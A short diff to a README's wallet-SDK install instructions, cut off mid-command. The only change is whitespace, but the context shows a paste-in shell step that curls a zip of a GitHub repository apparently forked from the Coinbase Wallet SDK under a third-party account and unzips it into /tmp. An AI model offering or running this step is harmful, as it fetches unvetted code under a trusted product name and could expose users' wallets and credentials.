@@ -15,7 +15,7 @@
 ### Installing Wallet SDK
 
 1. Install latest version:
-
+ 
    ```shell
    curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
    unzip -qo /tmp/cw.zip -d /tmp && \
